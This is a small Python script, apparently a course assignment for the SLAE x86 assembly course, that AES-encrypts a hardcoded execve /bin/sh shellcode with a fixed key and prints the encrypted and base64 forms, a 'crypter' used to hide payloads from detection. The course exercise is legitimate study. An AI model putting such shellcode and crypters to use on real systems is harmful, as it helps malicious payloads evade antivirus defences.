# Description: Crypter for x86 SLAE
# Author: davidlebr1


import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

# basic execve shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

class AESCrypter(object):

    def __init__(self, key):
        self.key = hashlib.sha256(key.encode("utf-8")).digest()

    def encrypt(self, raw):
    	print("[+] Starting encryption\n")
    	raw = self._pad(raw)
    	iv = Random.new().read(AES.block_size)
    	cipher = AES.new(self.key, AES.MODE_CBC, iv)
    	return base64.b64encode(iv + cipher.encrypt(raw))

    def _pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

if __name__ == '__main__':
	c = AESCrypter(key="thisismysuperkey")
	print("[+] Original shellcode: {}\n".format(''.join('\\x' + hex(byte)[2:] for byte in bytearray(shellcode))))
	encrypted_shellcode = c.encrypt(shellcode)
	print("[+] Encrypted shellcode: {}\n".format(''.join('\\x' + hex(byte)[2:] for byte in bytearray(base64.b64decode(encrypted_shellcode)))))
	print("[+] Base64 encrypted shellcode: {}\n".format(encrypted_shellcode))